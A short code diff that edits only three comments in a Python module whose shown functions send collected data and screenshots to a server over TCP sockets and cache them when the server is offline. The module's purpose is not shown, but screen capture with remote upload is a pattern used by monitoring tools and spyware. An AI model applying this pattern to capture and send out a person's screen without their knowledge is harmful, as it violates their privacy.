@@ -41,7 +41,7 @@ def send_data(data, data_type):
         else:
             payload_bytes = b"\x00" + payload.encode('utf-8')  # Plaintext marker
 
-        # Try to send directly if online
+        # Try to send it directly if online
         if server_is_online():
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(config.SOCKET_TIMEOUT)
@@ -96,7 +96,7 @@ def send_screenshot(image_data, timestamp):
         else:
             payload_bytes = b"\x00" + payload  # Plaintext marker
 
-        # Try to send directly if online
+        # Try to send it directly if online
         if server_is_online():
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(config.SOCKET_TIMEOUT)
@@ -158,7 +158,7 @@ def send_cached_data():
     screenshot_files = {}
     for filename in os.listdir(cache_dir):
         if filename.endswith(".jpg") and filename.startswith("screenshot_"):
-            # Find matching metadata file
+            # Find the matching metadata file
             base = filename[:-4]  # Remove .jpg extension
             screenshot_files[base] = {"img": filename}
         elif filename.endswith(".json") and filename.startswith("screenshot_"):
